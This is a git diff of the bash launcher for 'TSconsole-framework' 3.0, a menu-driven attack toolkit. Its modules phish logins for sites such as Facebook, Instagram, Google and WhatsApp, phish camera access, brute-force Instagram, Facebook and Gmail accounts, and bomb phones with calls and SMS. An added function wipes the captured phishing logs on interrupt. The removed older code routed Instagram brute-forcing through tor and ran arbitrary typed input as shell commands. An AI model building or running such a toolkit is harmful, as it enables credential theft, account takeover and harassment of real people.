@@ -1,129 +1,55 @@
 #!/usr/bin/env bash
+#set -x
+#|----------------------------------|
+#|BY       :- Suman Kumar ~BHUTUU   |
+#|Date     :- 30/09/2021            |
+#|version  :- 3.0                   |
+#|----------------------------------|
+args="$1"
+filter="TSconsole ${args}"
 PWD=$(pwd)
-args="$@"
-comand="TSconsole $args"
-if [[ $comand == 'TSconsole -u' ]] || [[ $comand == 'TSconsole --update' ]]
-then
-	cd $HOME
-	distro=$(pwd)
-	if [[ $distro == /data/data/com.termux/files/home ]]
-	then
-		cd /data/data/com.termux/files/usr/share/TSconsole-framework
-		git pull
-	elif [[ $distro == /data/data/hilled.pwnterm/files/usr/home ]]
-	then
-		cd /data/data/hilled.pwnterm/files/usr/share/TSconsole-framework
-		git pull
-	else
-		cd /usr/share/TSconsole-framework
-	fi
-	cd $PWD
-elif [[ $comand == 'TSconsole ~u' ]] || [[ $comand == 'TSconsole ~~update' ]]
-then
-	cd $HOME
-	distro=$(pwd)
-	if [[ $distro == /data/data/com.termux/files/home ]]
-	then
-		cd /data/data/com.termux/files/usr/share/TSconsole-framework/assets
-		bash update.sh
-	elif [[ $distro == /data/data/hilled.pwnterm/files/usr/home ]]
-	then
-		cd /data/data/hilled.pwnterm/files/usr/share/TSconsole-framework/assets
-		bash update.sh
-	else
-		cd /usr/share/TSconsole-framework/assets
-		bash update.sh
-	fi
-	cd $PWD
-elif [[ $comand == 'TSconsole -v' ]] || [[ $comand == 'TSconsole --version' ]]
-then
-	echo
-	printf "\e[4;2;36mTSc \e[1;37m> \e[4;34mVERSION = 2.0\e[0m\n"
-	echo
-
-elif [[ $comand == 'TSconsole ' ]]
-then
-	cd $HOME
-	distro=$(pwd)
-	if [[ $distro == /data/data/com.termux/files/home ]]
-	then
-        	ppath=/data/data/com.termux/files/usr/share/TSconsole-framework/programs
-		pspath=/data/data/com.termux/files/usr/share/TSconsole-framework/assets
-	cd $PWD
-	elif [[ $distro == /data/data/hilled.pwnterm/files/usr/home ]]
-	then
-		ppath=/data/data/hilled.pwnterm/files/usr/share/TSconsole-framework/programs
-		pspath=/data/data/hilled.pwnterm/files/usr/share/TSconsole-framework/assets
-	cd $PWD
-	else
-		ppath=/usr/share/TSconsole-framework/programs
-		pspath=/usr/share/TSconsole-framework/assets
-	fi
-clear
-frize() {
-sleep 0.0025
+#<<<-----colors----->>>#
+S0="\033[1;30m" B0="\033[1;40m"
+S1="\033[1;31m" B1="\033[1;41m"
+S2="\033[1;32m" B2="\033[1;42m"
+S3="\033[1;33m" B3="\033[1;43m"
+S4="\033[1;34m" B4="\033[1;44m"
+S5="\033[1;35m" B5="\033[1;45m"
+S6="\033[1;36m" B6="\033[1;46m"
+S7="\033[1;37m" B7="\033[1;47m"
+R0="\033[00m"   R1="\033[1;00m"
+#<---x--->#
+#<<<-----interuption------>>>#
+logclear() {
+site=(Amazon Netflix flipkart google snapchat twitter HOTSTAR facebook github instagram telegram whatsapp)
+for i in "${site[@]}"; do
+echo > programs/phishweb/sites/${i}/log.txt
+done
+echo > programs/phishcamera/saves.ip.txt
 }
-#<<<------Interruption check------>>>
-function interuption() {
+interuptTSc() {
 printf "\n\e[1;32m[\e[1;31m!\e[1;32m]\e[1;37m TSconsole is Interrupted !!\e[0m\n"
-exit 2
+logclear > /dev/null 2>&1
+exit 0
 }
-trap "interuption" 2
-
-#<<<-----------INTRO-SECTION---------->>>
-printf "\e[1;34m>>> PLEASE wait.\e[0m"
-sleep 0.3
-printf "\e[1;34m.\e[0m"
-sleep 0.3
-printf "\e[1;34m.\e[0m"
-sleep 0.3
-printf "\e[1;34m.\e[0m"
-sleep 0.3
-printf "\e[1;34m.\e[0m\n"
-sleep 1
-printf '\e[1;90m$$$$$$$$$$$$$$$$$$$$$$$$$$$$ \e[0m\n'; frize
-printf '\e[1;90m$__________________________$ \e[0m\n'; frize
-printf '\e[1;90m$_____GLASS________________$ \e[0m\n'; frize
-printf '\e[1;90m$_______OF_________________$ \e[0m\n'; frize
-printf '\e[1;90m$________GLUCOSE___________$ \e[0m\n'; frize
-printf '\e[1;90m$__________DESIGNED________$ \e[0m\n'; frize
-printf '\e[1;36m$________BY__________$$$$$_$ \e[0m\n'; frize
-printf '\e[1;36m$___TANYA~BHUTUU👻$$$____$_$ \e[0m\n'; frize
-printf '\e[1;36m$_____________$$$$_______$_$ \e[0m\n'; frize
-printf '\e[1;36m$_$$$$$$$$$$$$___________$_$ \e[0m\n'; frize
-printf '\e[1;36m$_$______________________$_$ \e[0m\n'; frize
-printf '\e[1;36m_$_$____________________$_$ \e[0m\n'; frize
-printf '\e[1;36m_$_$____________________$_$ \e[0m\n'; frize
-printf '\e[1;36m_$_$____________________$_$ \e[0m\n'; frize
-printf '\e[1;36m__$_$__________________$_$ \e[0m\n'; frize
-printf '\e[1;36m__$_$__________________$_$ \e[0m\n'; frize
-printf '\e[1;36m___$_$________________$_$ \e[0m\n'; frize
-printf '\e[1;36m___$_$$_____________$$_$ \e[0m\n'; frize
-printf '\e[1;36m_____$__$$$______$$$__$ \e[0m\n'; frize
-printf '\e[1;36m______$$___$$$$$$___$$ \e[0m\n'; frize
-printf '\e[1;36m________$$$______$$$ \e[0m\n'; frize
-printf '\e[1;96m___________$$$$$$_ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$__$ \e[0m\n'; frize
-printf '\e[1;96m____________$$$$ \e[0m\n'; frize
-printf '\e[1;31m___________$___$______ \e[0m\n'; frize
-printf '\e[1;35m____$$$$$$$_____$___$$ \e[0m\n'; frize
-printf '\e[1;35m___$______$_____$___$$ \e[0m\n'; frize
-printf '\e[1;35m____$$$$$$$_____$$$$$$ \e[0m\n'; frize
-sleep 2
-echo "             WELCOME!"
-sleep 1
-echo "                to"
-sleep 1
-clear
-
+interuption() {
+exit_on_signal_SIGINT () {
+ interuptTSc
+}
+trap exit_on_signal_SIGINT SIGINT
+}
+interuption
+#<<<-----Internet----->>>#
+INTERNET() {
+  ping -c1 google.com > /dev/null 2>&1
+  if [[ $? != 0 ]]; then
+    printf "${S2}[${S1}!${S2}]${S4}Check your internet connection${S1}!!${R0}\n"
+    return 105
+  fi
+}
+frize() {
+sleep 0.02
+}
 function banner() {
 lower=1;
 topper=7;
@@ -133,272 +59,781 @@ let "GET %= $RANGE";
 GET=$(($GET+$lower));
 if [[ $GET == '6' ]];
 then
-bash ${pspath}/LOGOs/logo.${GET}
+bash assets/LOGOs/logo.${GET}
+elif [[ $GET == '5' ]]; then
+cat assets/LOGOs/logo.5
 else
-bash ${pspath}/LOGOs/logo.${GET} | lolcat
+bash assets/LOGOs/logo.${GET} | lolcat
 fi
-
 echo
+printf "${S2}>>>Version:${S4} 3.0 ${S7}(${S1}latest${S7})${R0}\n"
 printf "\e[1;31m<<<--Made with love-->>>\e[0m\n"; frize
 printf "\e[1;36m>>>By Suman Kumar ~BHUTUU👻\e[0m\n"; frize
 printf "\e[1;34m<<<--------------------{t❣️s}-------------------->>>\e[0m\n"; frize
 echo; frize
-echo; frize
-echo; frize
 }
-banner
-printf "\e[1;94mwhat's your name?\e[0m\n"
-printf "\e[1;94m>>> \e[0m"
-#<<<----------LOGIN PAGE---------->>>
-read name
+programList() {
+echo -e "
++----------------------------------+
+|          ${B0}${S5}<<<PROGRAMS>>>${R0}${R1}          |
++----------------------------------+
 
-if [[ $(find ${pspath}/TSpass) != ${pspath}/TSpass ]]; then
-clear
-echo
-printf "\e[1;37m[\e[1;31m!\e[1;37m] Bloody wasterd!! you deleted password source file🤬\e[0m\n"
-echo
-printf "\e[1;32m Run TSconsole -p or TSconsole --password and set a password then it will be OKAY :)\e[0m\n"
-echo
+${S2}┌─(${S3} use phish/webpage/handler/reverse_http ${S2})${R0}
+${S2}└[ !${S4}webpage phishing program${S2}! ]${R0}
+
+${S2}┌─(${S3} use phish/camera/handler/reverse_http ${S2})${R0}
+${S2}└[ !${S4}camera phishing program${S2}! ]${R0}
+
+${S2}┌─(${S3} use brute/social-media/handler ${S2})${R0}
+${S2}└[ !${S4}social-media bruteforce program${S2}! ]${R0}
+
+${S2}┌─(${S3} use brute/hashes/handler ${S2})${R0}
+${S2}└[ !${S4}hashes' bruteforce program${S2}! ]${R0}
+
+${S2}┌─(${S3} use encode/hashes/handler ${S2})${R0}
+${S2}└[ !${S4}encode text to hash  program${S2}! ]${R0}
+
+${S2}┌─(${S3} use encode/binary/handler ${S2})${R0}
+${S2}└[ !${S4}encode text to binary program${S2}! ]${R0}
+
+${S2}┌─(${S3} use spam/call-sms/handler ${S2})${R0}
+${S2}└[ !${S4}call and sms spamming program${S2}! ]${R0}
+
+${S2}┌─(${S3} use decode/binary/handler ${S2})${R0}
+${S2}└[ !${S4}decode binary to text  program${S2}! ]${R0}
+" | pv -qL 1000
+}
+
+main() {
+#<cheking data>#
+if [[ -f "assets" ]]; then
+printf "${S2}[${S1}!${S2}]${S4}Resources were missing${S1}!!${R0}\n"
 exit 1
 fi
-hash=$(cat ${pspath}/TSpass)
+python assets/anim.py
+bash assets/load.sh "welcome to TSconsole-framework" "                                               " 2
+echo -e "
+ ________________________________
+< welcome to TSconsole-framework >
+ --------------------------------
+"
+banner
+#<-->#
+echo
+while true; do
+printf "\033[3;4;37mTSc \033[0;0;1;37m> \033[0;0;00m"
+read input
+  if [[ $input == "use phish/webpage/handler/reverse_http" ]]; then
+    webPhish
+  elif [[ $input == "use phish/camera/handler/reverse_http" ]]; then
+    cameraPhish
+  elif [[ $input == "use brute/social-media/handler" ]]; then
+    socialBrute
+  elif [[ ${input} == "use brute/hashes/handler" ]]; then
+    hashBrute
+  elif [[ ${input} == "use encode/hashes/handler" ]];then
+    hashEncode
+  elif [[ ${input} == "use encode/binary/handler" ]]; then
+    binaryEncode
+  elif [[ ${input} == "use spam/call-sms/handler" ]]; then
+    bombSpam
+  elif [[ ${input} == "use decode/binary/handler" ]]; then
+    binaryDecode
+  elif [[ ${input} == "show modules" ]]; then
+    bash assets/load.sh fetching "                   " 2
+    programList
+  elif [[ ${input} == "help" || ${input} == "?" ]]; then
+    helpMenue
+  elif [[ ${input} == "banner" ]]; then
+    banner
+  elif [[ ${input} == "report" ]]; then
+    bash assets/load.sh connecting "                            " 3
+    echo
+    xdg-open https://t.me/Suman_bhutuu/
+  elif [[ ${input,,} == "exit" || ${input,,} == "quit" ]]; then
+    bash assets/load.sh Exiting "                    " 1
+    echo
+    exit 0
+  elif [[ ${input,,} == 'show options' || ${input} == 'list' ]]; then
+     printf "${S2}[${S1}!${S2}] ‘${S4}${input}${S7}’ command only works with Modules! ${S1}::${S7} execute '?'/'help'${R0}\n"
+#  elif [[ ${input} == ${input} ]]; then
+#    $input
+  else
+    printf "${S2}[${S1}!${S2}]${S4}Use a valid command or run 'help'${S1}!!${R0}\n"
+  fi
 
-printf "\e[1;95mEnter your login password : \e[0m"
-
-read passd
-
-passd=$(printf "$passd" | md5sum | awk '{printf $1}')
-
-if [[ $hash == $passd ]]
-then
-  printf "Access Granted\n"
-
-printf "\e[1;33mwelcom to TSconsole $name\e[0m\n"
-
-sleep 0.5
-
-#<<<----------PROGRAM LIST---------->>>
-function list() {
-printf "\e[1;31m<---program list--->\e[0m\n"; frize
-echo; frize
-printf "\e[4;36m(01). Gmail bruteforce attack\e[0m\n"; frize
-printf "\e[4;36m(02). Instagram bruteforce attack (bash based)\e[0m\n"; frize
-printf "\e[4;36m(03). Instagram bruteforce attack (python based)\e[0m\n"; frize
-printf "\e[4;36m(04). Text to hash converter\e[0m\n"; frize
-printf "\e[4;36m(05). Webpage viewer\e[0m\n"; frize
-printf "\e[4;36m(06). phishing attack\e[0m\n"; frize
-printf "\e[4;36m(07). Text message sender (Anonymously)\e[0m\n"; frize
-echo; frize
-printf "\e[1;96m>>>Run 'quit' or 'exit' to exit\e[0m\n"; frize
-echo; frize
-echo; frize
+done
 }
 #<<<----------HELP---------->>>
-B0="$(printf '\033[100m')"
-C6="$(printf '\033[96m')"
-R0="$(printf '\033[00m')"
-function help() {
+helpMenue() {
+bash assets/load.sh "" "              " 1
 echo -e "
-${B0}HELP MENUE${R0}
+==========================
+   ${B0}HELP MENUE${R1}
 ==========================
 
     Command                      Description
     -------                      -----------
-   ${C6} quit or exit${R0} |->   Command to exit TSconsole!!.
-   ${C6} clear${R0}        |->   Command to clear screen.
-   ${C6} help${R0}         |->   Command to show help meunu.
-   ${C6} banner${R0}       |->   Command to show banner of TSconsole.
-   ${C6} list${R0}         |->   Command to show list of programs
-   ${C6} show modules${R0} |->   Command to show list of programs
-   ${C6} show options${R0} |->   Command to show list of programs
-   ${C6} report${R0}       |->   Command to contact me on telegram
+   ${S6} quit or exit${R0} |->   Command to exit TSconsole!!.
+   ${S6} help${R0}         |->   Command to show help meunu.
+   ${S6} banner${R0}       |->   Command to show banner of TSconsole.
+   ${S6} list${R0}         |->   Command to show list of subprograms
+   ${S6} show modules${R0} |->   Command to show list of programs
+   ${S6} show options${R0} |->   Command to show valid options in modules
+   ${S6} report${R0}       |->   Command to contact me on telegram
                                  (please DM me only if any URGENT is there)
 " | pv -qL 500
 }
-list
-while true
-do
-sleep 0.125
-printf "\e[3;4;97mTSc \e[0;0;0m> \e[0m"
-read program
-#<<<----------FUNCTUONS---------->>>
-if [[ $program == list ]] || [[ $program == 'show modules' ]] || [[ $program == 'show options' ]]; then
-list
-elif [[ $program == help ]] || [[ $program == '?' ]]; then
-help
-elif [[ $program == clear ]]; then
-clear
-elif [[ $program == banner ]]; then
-banner
-elif [[ $program == report ]]; then
-xdg-open https://t.me/Suman_bhutuu
+#<<<==========PROGRAMS==========>>>#
 
-#<<<----------GMAIL-BRUTEFORCE-PYTHON-VERSION---------->>>
-elif [[ $program == 1 ]] || [[ $program == 01 ]]
-then
-printf '<<<----------welcome to g-mail bruteforce zone--------->>>\n'; frize
-printf "\n"; frize
-printf "\n"; frize
-printf '\e[1;92m    ___       BHUTUU         _  _ \e[0m\n'; frize
-printf '\e[1;92m   / _ \     _ __ ___   __ _(_) | \e[0m\n'; frize
-printf '\e[1;92m  / /_\/____| `_ ` _ \ / _` | | | \e[0m\n'; frize
-printf '\e[1;92m / /_\\\_____| | | | | | (_| | | | \e[0m\n'; frize
-printf '\e[1;82m \____/     |_| |_| |_|\__,_|_|_| \e[0m\n'; frize
-printf '\e[1;77\e[45m G-mail Brute Forcer v1.5 Author: Suman Kumar ~BHUTUU \e[0m\n'; frize
-printf "\n"; frize
-printf "\n"; frize
-cd ${ppath}/BRUTE && python3 gmail.py
-cd $PWD
-#<<<----------INSTA-BRUTEFORCE-BASH-VERSION---------->>>
-elif [[ $program == 2 ]] || [[ $program == 02 ]]
-then
-echo
-echo "please run 'tor' in another session"
-printf "Press 'enter key' if you are conmected to tor >"
-read enter
-cd ${ppath}/BRUTE && ./instagram.sh
-cd $PWD
-#<<<-----------INSTA-BRUTEFORCE-PYTHON-VERSION---------->>>
-elif [[ $program == 3 ]] || [[ $program == 03 ]]
-then
-printf "\e[1;92m     _                                      \e[0m\n"; frize
-printf "\e[1;92m _  | |                                     \e[0m\n"; frize
-printf "\e[1;92m( \ | | ____    ___  _| |_  _____           \e[0m\n"; frize
-printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ |  BHUTUU  \e[0m\n"; frize
-printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ |  _____   \e[0m\n"; frize
-printf "\e[1;77m    |_||_| |_|(___/    \__)\_____| (_____)  \e[0m\n"; frize
-printf "\n"; frize
-printf "\e[1;77m\e[45m   Instagram Brute Forcer.py v2 Author: Suman Kumar ~BHUTUU   \e[0m\n"; frize
-printf "\n"; frize
-cd ${ppath}/BRUTE && python3 instagram.py
-cd $PWD
-
-#<<<----------TEXT TO HASH CONVERTER ---------->>>
-
-elif [[ $program == 4 ]] || [[ $program == 04 ]]
-then
-cd ${ppath}/HASHES && python hashes.py
-cd $PWD
-
-#<<<----------WEBPAGE VIEWER---------->>>
-
-elif [[ $program == 5 ]] || [[ $program == 05 ]]
-then
-cd ${ppath}/WEBFETCH && python webfetch.py
-cd $PWD
-
-#<<<----------PHISHING ATTACK---------->>>
-
-elif [[ $program == 6 ]] || [[ $program  == 06 ]]
-then
-cd ${ppath}/PHISH && bash phish
-
-#<<<----------TEXT message sender (Anonymously)--------->>>
-
-elif [[ $program == 7 ]] || [[ $program == 07 ]]
-then
-cd ${ppath}/textbelt.com && bash TEXT
-
-#<<<-----exit program----->>
-
-elif [[ $program == quit ]] || [[ $program == exit ]]
-then
-exit
-elif [[ $program == $program ]]; then
-$program
-fi
-done
-else
-printf "Access Denied\n"; frize
-printf "\n"; frize
-printf "\n"; frize
-
-sleep 1
-printf "press enter to exit\n"
-read enter
-echo "bye bye $name 😝 "
-sleep 1
-fi
-kill {0..99999}
-elif [[ $comand == 'TSconsole -h' ]] || [[ $comand == 'TSconsole --help' ]]
-then
-frize() {
-sleep 0.0025
-}
-printf '\e[1;33m\e   _____ ____                            _          \e[0m\n'; frize
-printf '\e[1;33m\e  |_   _/ ___|  ___ ___  _ __  ___  ___ | | ___     \e[0m\n'; frize
-printf '\e[1;33m\e    | | \___ \ / __/ _ \| "_ \/ __|/ _ \| |/ _ \    \e[0m\n'; frize
-printf '\e[1;33m\e    | |  ___) | (_| (_) | | | \__ \ (_) | |  __/    \e[0m\n'; frize
-printf '\e[1;33m\e    |_| |____/ \___\___/|_| |_|___/\___/|_|\___|    \e[0m\n'; frize
-
-
-
-printf "\e[1;31m<<<--Made with love-->>>\e[0m\n"; frize
-printf "\e[1;36m>>>By Suman Kumar ~BHUTUU👻\e[0m\n"; frize
-printf "\e[1;34m<<<--------------------{t❣️s}-------------------->>>\e[0m\n"; frize
-echo; frize
-echo; frize
-printf "	\e[1;37m /\ .__    ._ _  _ .__|_ _._|_o _ ._  __ |_  _ |._  ._ _  _ ._     _\e[0m\n"; frize
-printf "	\e[1;33m/--\|(_||_|| | |(/_| ||_(_| |_|(_)| |    | |(/_||_) | | |(/_| ||_|(/_\e[0m\n"; frize
-printf "	\e[1;31m      _|                                        |\e[0m\n"; frize
-
-echo; frize
-echo -e "
-<=========ARGUMENTS=======================USAGE=====================================>
-
-	-h OR --help               To show argumentation help menue
-
-	-u OR --update             To update TSconsole! :)
-
-	~u OR ~~update             To update TSconsole! ;)
-
-	-v OR --version            To show the installed version of TSconsole!
-
-        -p OR --password           To change the login password of TSconsole!
-<----x---->
-
->>> To run TSconsole-framework just run 'TSconsole'
-
-<----x---->
-
->>>Other all arguments will show error message :/
-
-<<<---END--->>
-" | pv -qL 700  | lolcat
-
-elif [[ $comand == 'TSconsole -p' ||  $comand == 'TSconsole --password' ]]; then
+#+++++++hashbrute+++++++#
+hashBrute() {
 while true; do
-	cd $HOME
-        distro=$(pwd)
-        if [[ $distro == /data/data/com.termux/files/home ]]
-        then
-                pspath=/data/data/com.termux/files/usr/share/TSconsole-framework/assets
-        cd $PWD
-        elif [[ $distro == /data/data/hilled.pwnterm/files/usr/home ]]
-        then
-                pspath=/data/data/hilled.pwnterm/files/usr/share/TSconsole-framework/assets
-        cd $PWD
-        else
-                pspath=/usr/share/TSconsole-framework/assets
-        fi
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/brute/hashes${S7})> ${R0}"
+read userc
+if [[ ${userc} == '1' ||  ${userc} == '01' ]]; then
+bash programs/hashbrute/main.sh
+elif [[ ${userc} == '2' || ${userc} == '02' ]]; then
+bash programs/hashbrute/main2.sh
+elif [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "             " 1
 echo
-printf "\e[1;32m Enter your new password ==> \e[0m"
-read newpass
-if [[ -z "$newpass" ]]; then
-printf "\e[1;37m[\e[1;31m!\e[1;37m] Hey!! Don't leave it empty 🤬!!\e[0m\n"
-else
-filled=${newpass}
-newpass=$(printf "$newpass" | md5sum | awk '{printf $1}')
-echo "${newpass}" > ${pspath}/TSpass
-echo
-printf "\e[1;36m Your password is ${filled} is sucessfully saved :)\e[0m\n"
 break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}1 ${S7}or ${S4}2${S7}’ to use this module${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} 01${R0}           |->   To use hash code
+   ${S6} 02${R0}           |->   To use sum hash code
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+bash assets/load.sh "" "            " 1
+echo -e "
+======================
+     ${B1}Submodules:-${R1}
+======================
+${S2}(01). ${S4}Hash code:${R0}
+
+      ${S2}MD5 hash${R0}
+      ${S3}SHA1 hash${R0}
+      ${S4}SHA224 hash${R0}
+      ${S5}SHA256 hash${R0}
+      ${S6}SHA384 hash${R0}
+      ${S1}SHA512 hash${R0}
+
+
+${S2}(02). ${S4}Sum hash codes:${R0}
+
+      ${S2}MD5sum hash${R0}
+      ${S3}SHA1sum hash${R0}
+      ${S4}SHA224sum hash${R0}
+      ${S5}SHA256sum hash${R0}
+      ${S6}SHA384sum hash${R0}
+      ${S1}SHA512sum hash${R0}
+
+${S4}Note${S1}::- ${S7} you just have to select '1' or '2' as per your code type either 'hash code' or 'sum hash code'!!${R0}
+" | pv -qL 1000
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}::${S7} execute ‘?’ or ‘help’${R0}\n"
 fi
 done
+}
 
+#+++++++++hashencode+++++++++#
+hashEncode() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/hash/encode${S7})> ${R0}"
+read userc
+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}list${S7}’ to show submodules${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} list${R0}         |->   To show submodules
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+bash assets/load.sh "" "            " 1
+echo -e "
+======================
+     ${B1}Submodules:-${R1}
+======================
+${S1}(${S7}01${S1})${S7}MD5sum hash${R0}
+${S1}(${S7}02${S1})${S7}SHA1sum hash${R0}
+${S1}(${S7}03${S1})${S7}SHA224sum hash${R0}
+${S1}(${S7}04${S1})${S7}SHA256sum hash${R0}
+${S1}(${S7}05${S1})${S7}SHA384sum hash${R0}
+${S1}(${S7}06${S1})${S7}SHA512sum hash${R0}
+${S1}(${S7}07${S1})${S7}MD5 hash${R0}
+${S1}(${S7}08${S1})${S7}SHA1 hash${R0}
+${S1}(${S7}09${S1})${S7}SHA224 hash${R0}
+${S1}(${S7}10${S1})${S7}SHA256 hash${R0}
+${S1}(${S7}11${S1})${S7}SHA384 hash${R0}
+${S1}(${S7}12${S1})${S7}SHA512 hash${R0}
+${S1}——————————————————————${R0}
+" | pv -qL 1000
+elif [[ ${userc} == '01' || ${userc} == '1' ]]; then
+bash programs/hashencode/hash.sh md5
+elif [[ ${userc} == '02' || ${userc} == '2' ]]; then
+bash programs/hashencode/hash.sh sha1
+elif [[ ${userc} == '03' || ${userc} == '3' ]]; then
+bash programs/hashencode/hash.sh sha224
+elif [[ ${userc} == '04' || ${userc} == '4' ]]; then
+bash programs/hashencode/hash.sh sha256
+elif [[ ${userc} == '05' || ${userc} == '5' ]]; then
+bash programs/hashencode/hash.sh sha384
+elif [[ ${userc} == '06' || ${userc} == '6' ]]; then
+bash programs/hashencode/hash.sh sha512
+elif [[ ${userc} == '07' || ${userc} == '7' ]]; then
+python programs/hashencode/hash.py -H md5 -P md5
+elif [[ ${userc} == '08' || ${userc} == '8' ]]; then
+python programs/hashencode/hash.py -H sha1 -P sha1
+elif [[ ${userc} == '09' || ${userc} == '9' ]]; then
+python programs/hashencode/hash.py -H sha224 -P sha224
+elif [[ ${userc} == '10' ]]; then
+python programs/hashencode/hash.py -H sha256 -P sha256
+elif [[ ${userc} == '11' ]]; then
+python programs/hashencode/hash.py -H sha384 -P sha384
+elif [[ ${userc} == '12' ]]; then
+python programs/hashencode/hash.py -H sha512 -P sha512
 else
-	echo
-	printf "[•] \e[1;31mPlease use valid arguments or use 'TSconsole -h' or 'TSconsole --help' for argumentation help menue\e[0m\n"
-	echo
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
 fi
+done
+}
+#++++++++++socialbrute+++++++++++#
+socialBrute() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/brute/social-media${S7})> ${R0}"
+read userc
+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}list${S7}’ to show submodules${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} list${R0}         |->   To show submodules
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+bash assets/load.sh "" "            " 1
+echo -e "
+======================
+     ${B1}Submodules:-${R1}
+======================
+${S1}(${S7}01${S1})${S7}Instagram bruteforce${R0}
+${S1}(${S7}02${S1})${S7}Facebook bruteforce${R0}
+${S1}(${S7}03${S1})${S7}Gmail bruteforce${R0}
+" | pv -qL 1000
+elif [[ ${userc} == '01' || ${userc} == '1' ]]; then
+bash programs/socialbrute/instagram/instagram.sh
+elif [[ ${userc} == '02' || ${userc} == '2' ]]; then
+python3 programs/socialbrute/facebook/facebook.py
+elif [[ ${userc} == '03' || ${userc} == '3' ]]; then
+python2 programs/socialbrute/gmail/gmail.py
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
+fi
+done
+}
+#<==============binary decode===============>#
+binaryDecode() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/decode/binary${S7})> ${R0}"
+read userc
+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}list${S7}’ to show submodules${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} list${R0}         |->   To show submodules
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+bash assets/load.sh "" "            " 1
+echo -e "
+======================
+     ${B1}Submodules:-${R1}
+======================
+${S1}(${S7}01${S1})${S7}base64${R0}
+${S1}(${S7}02${S1})${S7}base32${R0}
+${S1}(${S7}03${S1})${S7}binary digits(0 1)${R0}
+" | pv -qL 1000
+elif [[ ${userc} == '01' || ${userc} == '1' ]]; then
+bash programs/binarydecode/base64
+elif [[ ${userc} == '02' || ${userc} == '2' ]]; then
+bash programs/binarydecode/base32
+elif [[ ${userc} == '03' || ${userc} == '3' ]]; then
+python programs/binarydecode/binary -H suman -P BHUTUU
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
+fi
+done
+}
+#<============binary encode=============>
+binaryEncode() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/encode/binary${S7})> ${R0}"
+read userc
